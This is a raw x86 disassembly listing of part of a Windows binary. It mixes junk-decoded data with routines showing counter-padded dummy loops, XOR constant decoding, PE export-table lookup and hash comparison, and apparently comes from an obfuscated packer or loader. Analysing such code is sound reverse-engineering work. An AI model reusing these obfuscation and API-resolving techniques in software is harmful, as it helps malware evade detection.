  407e35:	test   DWORD PTR [ebx+0x68],0x129ae4e9
  407e3c:	xchg   WORD PTR [ebp-0x5eb5d7f8],bp
  407e43:	mov    al,ds:0xae3e002
  407e48:	mov    ebp,0x864db3bf
  407e4d:	mov    cl,0xa1
  407e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e50:	jns    0x407e70
  407e52:	out    dx,al
  407e53:	mov    ch,0x1
  407e55:	cwde   
  407e56:	xchg   ebx,eax
  407e57:	xor    BYTE PTR [edi-0x7ae65a94],bl
  407e5d:	cwde   
  407e5e:	loope  0x407e5d
  407e60:	(bad)  
  407e61:	in     eax,dx
  407e62:	es and eax,0x20a57cfb
  407e68:	dec    ebp
  407e69:	pop    ecx
  407e6a:	(bad)  
  407e6b:	retf   
  407e6c:	ret    
  407e6d:	fisttp WORD PTR [ebx+0x49]
  407e70:	push   ds
  407e71:	mov    esi,0xf166ffe3
  407e76:	(bad)  
  407e78:	rcr    bl,0xa8
  407e7b:	adc    eax,0x299544a
  407e80:	ret    
  407e81:	mov    al,0x38
  407e83:	xchg   esp,eax
  407e84:	jns    0x407e28
  407e86:	fisubr DWORD PTR [ecx+0x5c]
  407e89:	sbb    cl,BYTE PTR [ebx-0x707ef847]
  407e8f:	add    bh,cl
  407e91:	dec    edi
  407e92:	rcr    esp,cl
  407e94:	into   
  407e95:	sub    BYTE PTR [edi+0x23f17f11],0x74
  407e9c:	lds    edx,FWORD PTR [ebp-0x63e6a532]
  407ea2:	fs mov edx,0x8f35ac7a
  407ea8:	cdq    
  407ea9:	sub    esp,DWORD PTR [eax+0x66]
  407eac:	cld    
  407ead:	stos   DWORD PTR es:[edi],eax
  407eae:	jno    0x407eda
  407eb0:	aas    
  407eb1:	std    
  407eb2:	and    dl,BYTE PTR [bp-0x7e37]
  407eb7:	xor    BYTE PTR [edi-0x16d9af06],cl
  407ebd:	inc    esp
  407ebe:	std    
  407ebf:	(bad)  
  407ec0:	jmp    DWORD PTR [esi-0x75]
  407ec3:	inc    ebp
  407ec4:	cld    
  407ec5:	mov    edi,DWORD PTR [ebp+0x8]
  407ec8:	mov    edi,DWORD PTR [edi]
  407eca:	mov    edx,0x8a42
  407ecf:	xor    ax,dx
  407ed2:	mov    edx,0x3b08
  407ed7:	add    ax,dx
  407eda:	cmp    ax,WORD PTR [edi]
  407edd:	je     0x408061
  407ee3:	mov    eax,DWORD PTR [ebp-0x14]
  407ee6:	xor    eax,ecx
  407ee8:	jmp    0x40801f
  407eed:	(bad)  
  407eee:	pop    edx
  407eef:	fst    st(3)
  407ef1:	jge    0x407f46
  407ef3:	out    0x5d,al
  407ef5:	jnp    0x407ee7
  407ef7:	inc    esi
  407ef8:	sub    DWORD PTR [esi-0x69],ebx
  407efb:	retf   0xdd7f
  407efe:	enter  0x7c7c,0x6
  407f02:	jg     0x407f80
  407f04:	jl     0x407ef1
  407f06:	pop    edx
  407f07:	out    0x57,eax
  407f09:	mov    BYTE PTR [ecx+0x55],bl
  407f0c:	js     0x407f13
  407f0e:	push   ds
  407f0f:	call   0x3de1:0x2b1cb25a
  407f16:	cdq    
  407f17:	out    dx,al
  407f18:	(bad)  
  407f19:	leave  
  407f1a:	(bad)  
  407f1b:	pop    esp
  407f1c:	popf   
  407f1d:	imul   ebx,ecx,0x7e905d81
  407f23:	mov    bh,0xbd
  407f25:	lock mov al,ds:0x884cb54e
  407f2b:	xor    eax,0xf800abe7
  407f30:	shr    BYTE PTR [ebp-0x4c06fb2d],1
  407f36:	xor    edi,DWORD PTR [ecx]
  407f38:	iret   
  407f39:	inc    ecx
  407f3a:	les    esi,FWORD PTR [edx+eiz*1+0x114a987]
  407f41:	mov    ebx,0x626e1a8e
  407f46:	sbb    al,0x17
  407f48:	outs   dx,DWORD PTR ds:[esi]
  407f49:	and    al,0xb8
  407f4b:	jecxz  0x407ecf
  407f4d:	inc    edx
  407f4e:	mov    bh,0xc4
  407f50:	add    eax,DWORD PTR [edi+0x45dac00e]
  407f56:	adc    ecx,DWORD PTR [ecx-0xefe349e]
  407f5c:	sub    DWORD PTR [edx-0x1ce826c6],edx
  407f62:	in     eax,0x7f
  407f64:	das    
  407f65:	sbb    DWORD PTR [eax],eax
  407f67:	pop    ss
  407f68:	push   ebp
  407f69:	aad    0x28
  407f6b:	fdivr  DWORD PTR [ecx+edi*8]
  407f6e:	push   ds
  407f6f:	push   0xffffffb4
  407f71:	pop    esi
  407f72:	sub    al,BYTE PTR [eax+ebp*1-0x62]
  407f76:	push   0x301c2923
  407f7b:	in     al,dx
  407f7c:	pop    ecx
  407f7d:	or     DWORD PTR [edi+edx*2-0x18],0xffffffc3
  407f82:	xchg   esi,eax
  407f83:	and    eax,0xaf1fe6e9
  407f88:	(bad)  
  407f89:	dec    esp
  407f8a:	bswap  eax
  407f8c:	adc    ebx,edi
  407f8e:	inc    ecx
  407f8f:	xlat   BYTE PTR ds:[ebx]
  407f90:	xchg   ebx,eax
  407f91:	sub    eax,0xefbc4642
  407f96:	ins    BYTE PTR es:[edi],dx
  407f97:	mov    ds:0x70645aaa,eax
  407f9c:	cmc    
  407f9d:	and    eax,0x8bb48761
  407fa2:	dec    ebp
  407fa3:	lea    edi,[ecx+0x4c]
  407fa6:	sahf   
  407fa7:	pop    eax
  407fa8:	xor    ah,BYTE PTR ds:0x12d5328e
  407fae:	inc    edi
  407faf:	sbb    BYTE PTR [ebp+0x22],ah
  407fb2:	jg     0x407f5b
  407fb4:	cmp    esi,DWORD PTR [ecx+esi*4-0x6d]
  407fb8:	xor    eax,0xe9a885e9
  407fbd:	adc    ebp,DWORD PTR [ecx-0xe36685a]
  407fc3:	(bad)  
  407fc4:	cmp    bl,BYTE PTR [ecx]
  407fc6:	inc    ecx
  407fc7:	mov    cl,0x42
  407fc9:	adc    al,0x49
  407fcb:	dec    ebx
  407fcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fcd:	pop    ebp
  407fce:	rcr    DWORD PTR [esi-0x2f1d9ec2],cl
  407fd4:	js     0x407f80
  407fd6:	mov    ds:0x272a35fe,al
  407fdb:	and    BYTE PTR [esi],bh
  407fdd:	mov    ebx,0x2d14175e
  407fe2:	fcmove st,st(3)
  407fe4:	or     eax,edi
  407fe6:	ret    
  407fe7:	sar    DWORD PTR [eax],1
  407fe9:	mov    esi,0xb9b757d1
  407fee:	loopne 0x407fa1
  407ff0:	(bad)  
  407ff1:	mov    ah,0x86
  407ff3:	scas   al,BYTE PTR es:[edi]
  407ff4:	fabs   
  407ff6:	mov    bh,0xa8
  407ff8:	test   dh,0xda
  407ffb:	nop
  407ffc:	push   esp
  407ffd:	add    eax,0x765ab677
  408002:	test   al,0x47
  408004:	mov    dh,0xc3
  408006:	mov    BYTE PTR [esi+0x66b3a3ce],dl
  40800c:	leave  
  40800d:	pop    ecx
  40800e:	xlat   BYTE PTR ds:[ebx]
  40800f:	lahf   
  408010:	inc    esp
  408011:	dec    eax
  408012:	fstp   DWORD PTR [edx+0x2d778027]
  408018:	lds    ebp,FWORD PTR [esi+0x61]
  40801b:	cmp    eax,0x3691d84
  408020:	(bad)  
  408021:	mov    DWORD PTR [ebp-0x24],eax
  408024:	mov    eax,DWORD PTR [ebp-0x28]
  408027:	mov    di,WORD PTR [ebp-0x2c]
  40802b:	mov    ebx,0x8a42
  408030:	xor    di,bx
  408033:	add    di,dx
  408036:	movzx  edx,di
  408039:	mov    edi,DWORD PTR [ebp-0x8]
  40803c:	xor    edi,ecx
  40803e:	lea    edx,[edx+edi*1+0x32729e]
  408045:	add    DWORD PTR [eax],edx
  408047:	mov    eax,DWORD PTR [ebp-0x20]
  40804a:	mov    edx,DWORD PTR [ebp-0x8]
  40804d:	mov    edi,DWORD PTR [ebp-0x24]
  408050:	xor    edx,ecx
  408052:	add    edx,esi
  408054:	imul   edx,edi
  408057:	sub    DWORD PTR [eax],edx
  408059:	mov    eax,DWORD PTR [ebp-0x14]
  40805c:	jmp    0x407c08
  408061:	mov    eax,DWORD PTR [ebp-0xc]
  408064:	mov    edx,DWORD PTR [ebp-0x18]
  408067:	xor    eax,edx
  408069:	cmp    eax,0xe77c698d
  40806e:	je     0x407c05
  408074:	mov    eax,DWORD PTR [ebp-0x10]
  408077:	add    DWORD PTR [eax],0x7403501
  40807d:	jmp    0x407c05
  408082:	mov    eax,DWORD PTR [ebp-0x1c]
  408085:	cmp    DWORD PTR [eax],edi
  408087:	je     0x407c05
  40808d:	mov    eax,0x800f1c9c
  408092:	jmp    0x407c0c
  408097:	push   ebp
  408098:	mov    ebp,esp
  40809a:	push   ecx
  40809b:	xor    eax,eax
  40809d:	push   ecx
  40809e:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  4080a5:	sub    edx,0x2ef1
  4080ab:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  4080b2:	xor    ecx,ecx
  4080b4:	or     ecx,DWORD PTR ds:0x44d420
  4080ba:	sbb    ecx,DWORD PTR ds:0x410753
  4080c0:	mov    DWORD PTR ds:0x44d420,ecx
  4080c6:	mov    eax,DWORD PTR [ebp-0x4]
  4080c9:	dec    DWORD PTR ds:0x410753
  4080cf:	push   esi
  4080d0:	add    DWORD PTR ds:0x44a6cc,0x9cd
  4080da:	mov    esi,DWORD PTR [ebp-0x8]
  4080dd:	xor    ecx,0x7d4d
  4080e3:	mov    edx,0x7510857
  4080e8:	xor    eax,edx
  4080ea:	adc    DWORD PTR ds:0x424859,0x7d5d
  4080f4:	xor    esi,edx
  4080f6:	and    DWORD PTR ds:0x44d410,0x0
  408100:	mov    ecx,DWORD PTR ds:0x44d410
  408106:	inc    ecx
  408107:	mov    DWORD PTR ds:0x44d410,ecx
  40810d:	cmp    DWORD PTR ds:0x44d410,0x1b
  408114:	jne    0x408125
  40811a:	push   0x410845
  40811f:	call   DWORD PTR ds:0x442378
  408125:	cmp    DWORD PTR ds:0x44d410,0x13
  40812c:	jb     0x408100
  408132:	mov    ecx,0x32729e
  408137:	add    esi,ecx
  408139:	jmp    0x4081e2
  40813e:	xchg   esp,eax
  40813f:	and    al,ch
  408141:	and    al,0x5d
  408143:	out    0x6d,eax
  408145:	mov    ds:0x3d17a190,al
  40814a:	arpl   WORD PTR [eax+0x22],di
  40814d:	and    bh,ah
  40814f:	retf   
  408150:	jl     0x4081ce
  408152:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  408156:	xchg   cx,ax
  408158:	xlat   BYTE PTR ds:[ebx]
  408159:	(bad)  
  40815a:	push   esi
  40815b:	and    DWORD PTR [edx],0xffffff85
  40815e:	div    DWORD PTR es:[ebp-0x22]
  408162:	imul   esi,DWORD PTR [eax],0x66
  408165:	adc    dl,ah
  408167:	mov    dl,0x61
  408169:	lock mov edx,0x69821b46
  40816f:	jno    0x408165
  408171:	xchg   esi,eax
  408172:	adc    DWORD PTR [ebx+0x72e4cd95],ebp
  408178:	xor    esi,ebp
  40817a:	sub    esp,DWORD PTR [ecx]
  40817c:	inc    ebx
  40817d:	sub    DWORD PTR [esi],0x8062402e
  408183:	xor    eax,DWORD PTR [esp+ebx*2-0x36]
  408187:	ins    BYTE PTR es:[edi],dx
  408188:	ret    0x185c
  40818b:	stos   DWORD PTR es:[edi],eax
  40818c:	xchg   edx,eax
  40818d:	fdivr  DWORD PTR [ebx-0x12c27474]
  408193:	mov    ecx,0xa05b8871
  408198:	push   ebp
  408199:	push   edx
  40819a:	loope  0x408177
  40819c:	pop    es
  40819d:	pop    ecx
  40819e:	aam    0x2f
  4081a0:	jo     0x408189
  4081a2:	loope  0x40814e
  4081a4:	mov    al,ds:0x7145aba
  4081a9:	and    al,0xa9
  4081ab:	ds or  BYTE PTR cs:[ebp-0x5b],cl
  4081b0:	cmp    al,0x54
  4081b2:	je     0x40813f
  4081b4:	stc    
  4081b5:	cmp    DWORD PTR [ebx],ecx
  4081b7:	add    BYTE PTR ds:0xa0976b18,dl
  4081bd:	sub    DWORD PTR [edi-0x10],ecx
  4081c0:	mov    eax,DWORD PTR [ebx+ecx*2-0x57]
  4081c4:	je     0x4081c7
  4081c6:	cli    
  4081c7:	mov    ebp,0xe3778030
  4081cc:	pop    ds
  4081cd:	pop    edx
  4081ce:	xchg   esi,eax
  4081cf:	fisttp DWORD PTR [edi+0x4d2cb31a]
  4081d5:	je     0x408191
  4081d7:	xchg   BYTE PTR [esp+eiz*8],cl
  4081da:	stc    
  4081db:	sti    
  4081dc:	push   es
  4081dd:	sub    DWORD PTR [eiz*2-0x3efc1276],ebx
  4081e4:	imul   eax,esi
  4081e7:	mov    esi,DWORD PTR [ebp+0xc]
  4081ea:	mov    DWORD PTR ds:0x44a6d0,0x538a
  4081f4:	cmp    esi,eax
  4081f6:	jne    0x40826b
  4081fc:	mov    DWORD PTR ds:0x44a6d4,0x1c
  408206:	cmp    DWORD PTR ds:0x44a6d4,0x0
  40820d:	je     0x408255
  408213:	cmp    DWORD PTR ds:0x44a6d4,0xe
  40821a:	jne    0x408229
  408220:	push   DWORD PTR [ebp-0x14]
  408223:	call   DWORD PTR ds:0x44201c
  408229:	cmp    DWORD PTR ds:0x44a6d4,0xf
  408230:	jne    0x408243
  408236:	mov    esi,DWORD PTR ds:0x44a6d4
  40823c:	dec    esi
  40823d:	mov    DWORD PTR ds:0x44a6d4,esi
  408243:	mov    esi,DWORD PTR ds:0x44a6d4
  408249:	dec    esi
  40824a:	mov    DWORD PTR ds:0x44a6d4,esi
  408250:	jmp    0x408206
  408255:	mov    eax,DWORD PTR [ebp-0x4]
  408258:	mov    esi,DWORD PTR [ebp-0x8]
  40825b:	xor    eax,edx
  40825d:	xor    esi,edx
  40825f:	add    eax,ecx
  408261:	add    esi,ecx
  408263:	imul   eax,esi
  408266:	jmp    0x40834f
  40826b:	mov    eax,DWORD PTR [ebp+0xc]
  40826e:	mov    eax,DWORD PTR [eax+0x78]
  408271:	mov    DWORD PTR [ebp+0xc],eax
  408274:	mov    eax,DWORD PTR [ebp-0x4]
  408277:	mov    esi,DWORD PTR [ebp-0x8]
  40827a:	xor    eax,edx
  40827c:	xor    esi,edx
  40827e:	jmp    0x408327
  408283:	mov    edi,0x6a6fd0cd
  408288:	jns    0x4082cd
  40828a:	std    
  40828b:	ficomp WORD PTR [ebx+0x10]
  40828e:	jo     0x4082d5
  408290:	push   ebx
  408291:	jg     0x4082ba
  408293:	jae    0x40825f
  408295:	jl     0x408313
  408297:	mov    BYTE PTR [esp+edi*2+0x7c],bh
  40829b:	push   ebx
  40829c:	cdq    
  40829d:	rol    DWORD PTR [edx-0x4a],0xbf
  4082a1:	add    eax,0xe2efa858
  4082a6:	adc    dl,BYTE PTR [edx+0x23]
  4082a9:	out    0xb5,al
  4082ab:	xlat   BYTE PTR ds:[ebx]
  4082ac:	fldenv [esp+edi*4+0x2e9603b3]
  4082b3:	and    dl,bh
  4082b5:	jp     0x4082a7
  4082b7:	inc    ebp
  4082b8:	repnz or eax,0xa16dea79
  4082be:	or     BYTE PTR [esi-0x49],bl
  4082c1:	scas   al,BYTE PTR es:[edi]
  4082c2:	jp     0x4082ec
  4082c4:	pop    edi
  4082c5:	sahf   
  4082c6:	sar    BYTE PTR [ebx+edi*8-0x58b0083b],0x81
  4082ce:	cmp    dl,ch
  4082d0:	arpl   WORD PTR [eax+0xa],sp
  4082d3:	cmp    edi,DWORD PTR [edx+0x4d]
  4082d6:	pop    edi
  4082d7:	mov    eax,ds:0xcce16938
  4082dc:	jl     0x4082de
  4082de:	cld    
  4082df:	adc    eax,DWORD PTR [eax+0x1d83ccb5]
  4082e5:	push   ebx
  4082e6:	out    dx,eax
  4082e7:	mov    BYTE PTR [esi+0x11],dl
  4082ea:	sub    BYTE PTR [ecx+0x69],0x41
  4082ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ef:	add    eax,0x1a26bff2
  4082f4:	add    DWORD PTR [ecx],edi
  4082f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082f7:	enter  0x9287,0xfb
  4082fb:	adc    cl,BYTE PTR [esi+eiz*2]
  4082fe:	jo     0x40835f
  408300:	mov    ecx,0xe306a166
  408305:	sub    ecx,DWORD PTR [eax]
  408307:	push   esi
  408308:	retf   
  408309:	push   edi
  40830a:	sub    eax,0x8c03f25b
  40830f:	push   ebp
  408310:	push   edi
  408311:	cmc    
  408312:	xor    bl,BYTE PTR [ebx-0x30e3a236]
  408318:	sbb    esp,edx
  40831a:	inc    edx
  40831b:	sbb    eax,esi
  40831d:	icebp  
  40831e:	daa    
  40831f:	xor    eax,0x29ba839a
  408324:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  408326:	fadd   DWORD PTR [ebx]
  408328:	rol    DWORD PTR [ebx],0xf1
  40832b:	imul   eax,esi
  40832e:	mov    esi,DWORD PTR [ebp+0xc]
  408331:	cmp    esi,eax
  408333:	mov    eax,DWORD PTR [ebp-0x4]
  408336:	je     0x408258
  40833c:	xor    eax,edx
  40833e:	add    eax,ecx
  408340:	mov    ecx,DWORD PTR [ebp+0xc]
  408343:	imul   eax,ecx
  408346:	add    eax,DWORD PTR [ebp+0x8]
  408349:	mov    DWORD PTR [ebp+0xc],eax
  40834c:	mov    eax,DWORD PTR [ebp+0xc]
  40834f:	pop    esi
  408350:	leave  
  408351:	ret    0x8
  408354:	push   ebp
  408355:	mov    ebp,esp
  408357:	sub    esp,0xa0
  40835d:	push   0x4442b8
  408362:	xor    DWORD PTR ds:0x44d418,0x56f9
  40836c:	call   DWORD PTR ds:0x4420a0
  408372:	adc    DWORD PTR ds:0x447980,0x424865
  40837c:	test   eax,eax
  40837e:	mov    DWORD PTR ds:0x447984,0xdf5
  408388:	je     0x40839f
  40838e:	or     DWORD PTR ds:0x44a6e4,0x447990
  408398:	xor    eax,eax
  40839a:	jmp    0x409294
  40839f:	sub    DWORD PTR ds:0x44a6dc,0x44799c
  4083a9:	push   esi
  4083aa:	and    DWORD PTR ds:0x424865,0x0
  4083b4:	jmp    0x4083c6
  4083b9:	mov    esi,DWORD PTR ds:0x424865
  4083bf:	inc    esi
  4083c0:	mov    DWORD PTR ds:0x424865,esi
  4083c6:	cmp    DWORD PTR ds:0x424865,0x1f
  4083cd:	jae    0x408414
  4083d3:	cmp    DWORD PTR ds:0x424865,0x9
  4083da:	jne    0x4083eb
  4083e0:	push   0x3309
  4083e5:	call   DWORD PTR ds:0x44237c
  4083eb:	cmp    DWORD PTR ds:0x424865,0x8
  4083f2:	jne    0x408405
  4083f8:	mov    esi,DWORD PTR ds:0x424865
  4083fe:	inc    esi
  4083ff:	mov    DWORD PTR ds:0x424865,esi
  408405:	jmp    0x4083b9
  40840a:	or     DWORD PTR ds:0x44a6e0,0x7a7b
  408414:	mov    esi,0x876987
  408419:	mov    DWORD PTR ds:0x447990,0x1efc
  408423:	push   esi
  408424:	push   0x4442fc
  408429:	push   0x444324
  40842e:	call   DWORD PTR ds:0x442370
  408434:	mov    DWORD PTR ds:0x44d424,0x50e
  40843e:	cmp    eax,esi
  408440:	je     0x4084a1
  408446:	or     DWORD PTR ds:0x447980,0x78e6
  408450:	push   0x98786856
  408455:	add    DWORD PTR ds:0x42485d,0x6d32
  40845f:	push   0x344
  408464:	adc    DWORD PTR ds:0x41074f,0x5b99
  40846e:	push   0x545
  408473:	adc    DWORD PTR ds:0x44799c,0x2d37
  40847d:	push   0x675765
  408482:	sbb    DWORD PTR ds:0x410743,0x424865
  40848c:	push   0x67576
  408491:	push   0x86789768
  408496:	call   DWORD PTR ds:0x442368
  40849c:	jmp    0x409293
  4084a1:	or     edx,0x6156
  4084a7:	mov    ecx,0xf89c8535
  4084ac:	and    esi,0x7fd
  4084b2:	mov    DWORD PTR [ebp-0x20],ecx
  4084b5:	sub    esi,0x48f6
  4084bb:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  4084c2:	lea    eax,[ebp-0x4c]
  4084c5:	adc    DWORD PTR ds:0x44d424,ebx
  4084cb:	mov    DWORD PTR [ebp-0x30],eax
  4084ce:	add    esi,DWORD PTR ds:0x4479a0
  4084d4:	lea    eax,[ebp-0x54]
  4084d7:	mov    DWORD PTR [ebp-0x14],eax
  4084da:	mov    DWORD PTR ds:0x4479a4,0x12
  4084e4:	cmp    DWORD PTR ds:0x4479a4,0x0
  4084eb:	je     0x40853a
  4084f1:	cmp    DWORD PTR ds:0x4479a4,0x6
  4084f8:	jne    0x408509
  4084fe:	push   0x8a27
  408503:	call   DWORD PTR ds:0x442380
  408509:	cmp    DWORD PTR ds:0x4479a4,0x7
  408510:	jne    0x408521
  408516:	mov    eax,ds:0x4479a4
  40851b:	dec    eax
  40851c:	mov    ds:0x4479a4,eax
  408521:	xor    eax,eax
  408523:	xor    eax,DWORD PTR ds:0x4479a4
  408529:	dec    eax
  40852a:	mov    ds:0x4479a4,eax
  40852f:	jmp    0x4084e4
  408534:	sbb    esi,DWORD PTR ds:0x44d418
  40853a:	mov    eax,ds:0x4441a0
  40853f:	and    DWORD PTR ds:0x44d414,0x0
  408549:	jmp    0x40855b
  40854e:	mov    esi,DWORD PTR ds:0x44d414
  408554:	inc    esi
  408555:	mov    DWORD PTR ds:0x44d414,esi
  40855b:	cmp    DWORD PTR ds:0x44d414,0x16
  408562:	jae    0x4085a2
  408568:	cmp    DWORD PTR ds:0x44d414,0x1d
  40856f:	jne    0x40858a
  408575:	push   0x61c5
  40857a:	push   0x7b2c
  40857f:	push   0x2e55
  408584:	call   DWORD PTR ds:0x442384
  40858a:	jmp    0x40854e
  40858f:	movzx  edx,WORD PTR ds:0x44a6e0
  408596:	sbb    edx,DWORD PTR ds:0x424861
  40859c:	mov    DWORD PTR ds:0x44a6e0,edx
  4085a2:	mov    eax,DWORD PTR [eax+0x1c8]
  4085a8:	xor    edx,edx
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR ds:0x44d428,0x299a
  4085b6:	mov    edx,DWORD PTR [ebp-0x14]
  4085b9:	and    DWORD PTR ds:0x44d414,0x0
  4085c3:	xor    esi,esi
  4085c5:	add    esi,DWORD PTR ds:0x44d414
  4085cb:	inc    esi
  4085cc:	mov    DWORD PTR ds:0x44d414,esi
  4085d2:	cmp    DWORD PTR ds:0x44d414,0x27
  4085d9:	jne    0x4085f1
  4085df:	push   0x7f38
  4085e4:	push   0x1
  4085e6:	push   0x41098d
  4085eb:	call   DWORD PTR ds:0x442388
  4085f1:	cmp    DWORD PTR ds:0x44d414,0x1d
  4085f8:	jb     0x4085c3
  4085fe:	and    DWORD PTR ds:0x44a6d4,0x0
  408608:	xor    esi,esi
  40860a:	add    esi,DWORD PTR ds:0x44a6d4
  408610:	inc    esi
  408611:	mov    DWORD PTR ds:0x44a6d4,esi
  408617:	cmp    DWORD PTR ds:0x44a6d4,0xa
  40861e:	jne    0x40862f
  408624:	push   0x40b4
  408629:	call   DWORD PTR ds:0x4420ec
  40862f:	cmp    DWORD PTR ds:0x44a6d4,0x9
  408636:	jne    0x408649
  40863c:	mov    esi,DWORD PTR ds:0x44a6d4
  408642:	inc    esi
  408643:	mov    DWORD PTR ds:0x44a6d4,esi
  408649:	cmp    DWORD PTR ds:0x44a6d4,0x1b
  408650:	jb     0x408608
  408656:	or     DWORD PTR ds:0x4479a0,0x1250
  408660:	push   ebx
  408661:	movzx  esi,BYTE PTR ds:0x447990
  408668:	sub    esi,DWORD PTR ds:0x42485d
  40866e:	mov    DWORD PTR ds:0x447990,esi
  408674:	mov    esi,0x7510857
  408679:	mov    DWORD PTR ds:0x42485d,0x4f36
  408683:	xor    eax,esi
  408685:	sub    DWORD PTR ds:0x44d40c,0x44a6e8
  40868f:	push   edi
  408690:	mov    DWORD PTR ds:0x447990,0x1b
  40869a:	cmp    DWORD PTR ds:0x447990,0x0
  4086a1:	je     0x408750
  4086a7:	cmp    DWORD PTR ds:0x447990,0xd
  4086ae:	jne    0x4086c9
  4086b4:	push   0x7f5c
  4086b9:	push   0x1
  4086bb:	push   DWORD PTR [ebp-0x18]
  4086be:	push   0x52f7
  4086c3:	call   DWORD PTR ds:0x4420f0
  4086c9:	cmp    DWORD PTR ds:0x447990,0xe
  4086d0:	jne    0x4086e3
  4086d6:	mov    edi,DWORD PTR ds:0x447990
  4086dc:	dec    edi
  4086dd:	mov    DWORD PTR ds:0x447990,edi
  4086e3:	mov    edi,DWORD PTR ds:0x447990
  4086e9:	dec    edi
  4086ea:	mov    DWORD PTR ds:0x447990,edi
  4086f0:	jmp    0x40869a
  4086f5:	and    DWORD PTR ds:0x44d428,0x0
  4086ff:	mov    edi,DWORD PTR ds:0x44d428
  408705:	inc    edi
  408706:	mov    DWORD PTR ds:0x44d428,edi
  40870c:	cmp    DWORD PTR ds:0x44d428,0x9
  408713:	jne    0x408729
  408719:	push   0x3065
  40871e:	push   0x34da
  408723:	call   DWORD PTR ds:0x44238c
  408729:	cmp    DWORD PTR ds:0x44d428,0x8
  408730:	jne    0x408743
  408736:	mov    edi,DWORD PTR ds:0x44d428
  40873c:	inc    edi
  40873d:	mov    DWORD PTR ds:0x44d428,edi
  408743:	cmp    DWORD PTR ds:0x44d428,0x12
  40874a:	jb     0x4086ff
  408750:	mov    edi,0x32729e
  408755:	sbb    DWORD PTR ds:0x44d424,0x410753
  40875f:	add    eax,edi
  408761:	mov    DWORD PTR [edx],eax
  408763:	movzx  eax,BYTE PTR ds:0x44a6cc
  40876a:	mov    eax,ds:0x44441c
  40876f:	cmp    eax,0x23d14057
  408774:	mov    DWORD PTR ds:0x424855,0x37ed
  40877e:	mov    eax,DWORD PTR [ebp-0x18]
  408781:	mov    DWORD PTR ds:0x44a6e4,0x441f
  40878b:	je     0x4087a5
  408791:	neg    ecx
  408793:	mov    ecx,DWORD PTR [ebp-0x20]
  408796:	xor    eax,esi
  408798:	add    eax,edi
  40879a:	imul   eax,ecx
  40879d:	mov    DWORD PTR [ebp-0x20],eax
  4087a0:	jmp    0x40903b
  4087a5:	xor    edx,DWORD PTR ds:0x44a6cc
  4087ab:	xor    eax,esi
  4087ad:	add    eax,edi
  4087af:	and    DWORD PTR ds:0x447994,0x0
  4087b9:	mov    edx,DWORD PTR ds:0x447994
  4087bf:	inc    edx
  4087c0:	mov    DWORD PTR ds:0x447994,edx
  4087c6:	cmp    DWORD PTR ds:0x447994,0x1c
  4087cd:	jne    0x4087eb
  4087d3:	push   0x41098d
  4087d8:	push   0x5d39
  4087dd:	push   DWORD PTR [ebp-0x18]
  4087e0:	push   0x7a56
  4087e5:	call   DWORD PTR ds:0x442390
  4087eb:	cmp    DWORD PTR ds:0x447994,0x11
  4087f2:	jb     0x4087b9
  4087f8:	mov    ds:0x4442b0,eax
  4087fd:	mov    eax,DWORD PTR [ebp-0x20]
  408800:	xor    eax,esi
  408802:	inc    edx
  408803:	add    eax,edi
  408805:	movzx  edx,BYTE PTR ds:0x44a6e4
  40880c:	sub    edx,DWORD PTR ds:0x44798c
  408812:	mov    DWORD PTR ds:0x44a6e4,edx
  408818:	mov    ds:0x44441c,eax
  40881d:	mov    eax,DWORD PTR [ebp-0x18]
  408820:	or     DWORD PTR ds:0x41074b,0x6341
  40882a:	mov    edx,DWORD PTR ds:0x4442b0
  408830:	sbb    DWORD PTR ds:0x44799c,0x44a6e8
  40883a:	xor    eax,esi
  40883c:	sbb    DWORD PTR ds:0x44a6d4,0x68
  408846:	add    eax,edi
  408848:	mov    DWORD PTR ds:0x44a6e0,0x7dde
  408852:	cmp    edx,eax
  408854:	jne    0x40903b
  40885a:	mov    eax,DWORD PTR [ebp-0x18]
  40885d:	sbb    ebx,edx
  40885f:	mov    DWORD PTR [ebp-0x28],eax
  408862:	xor    eax,eax
  408864:	add    eax,DWORD PTR ds:0x4444e0
  40886a:	mov    ebx,DWORD PTR ds:0x4444ec
  408870:	sub    eax,ebx
  408872:	add    eax,DWORD PTR [eax+ebx*1]
  408875:	mov    eax,DWORD PTR [ebp-0x20]
  408878:	mov    DWORD PTR [ebp-0x1c],eax
  40887b:	mov    eax,ds:0x4441a0
  408880:	and    DWORD PTR ds:0x4479a4,0x0
  40888a:	mov    ebx,DWORD PTR ds:0x4479a4
  408890:	inc    ebx
  408891:	mov    DWORD PTR ds:0x4479a4,ebx
  408897:	cmp    DWORD PTR ds:0x4479a4,0x21
  40889e:	jne    0x4088b5
  4088a4:	push   0x32f9
  4088a9:	push   DWORD PTR [ebp-0x20]
  4088ac:	push   DWORD PTR [ebp-0x18]
  4088af:	call   DWORD PTR ds:0x4420f4
  4088b5:	cmp    DWORD PTR ds:0x4479a4,0x13
  4088bc:	jb     0x40888a
  4088c2:	mov    DWORD PTR ds:0x44a6e8,0x1c
  4088cc:	cmp    DWORD PTR ds:0x44a6e8,0x0
  4088d3:	je     0x408985
  4088d9:	cmp    DWORD PTR ds:0x44a6e8,0xe
  4088e0:	jne    0x4088ef
  4088e6:	push   DWORD PTR [ebp-0x24]
  4088e9:	call   DWORD PTR ds:0x4420f8
  4088ef:	cmp    DWORD PTR ds:0x44a6e8,0xf
  4088f6:	jne    0x40890b
  4088fc:	xor    edx,edx
  4088fe:	xor    edx,DWORD PTR ds:0x44a6e8
  408904:	dec    edx
  408905:	mov    DWORD PTR ds:0x44a6e8,edx
  40890b:	mov    edx,DWORD PTR ds:0x44a6e8
  408911:	dec    edx
  408912:	mov    DWORD PTR ds:0x44a6e8,edx
  408918:	jmp    0x4088cc
  40891d:	and    DWORD PTR ds:0x41073f,0x0
  408927:	jmp    0x40893b
  40892c:	xor    edx,edx
  40892e:	xor    edx,DWORD PTR ds:0x41073f
  408934:	inc    edx
  408935:	mov    DWORD PTR ds:0x41073f,edx
  40893b:	cmp    DWORD PTR ds:0x41073f,0x11
  408942:	jae    0x408985
  408948:	cmp    DWORD PTR ds:0x41073f,0x7
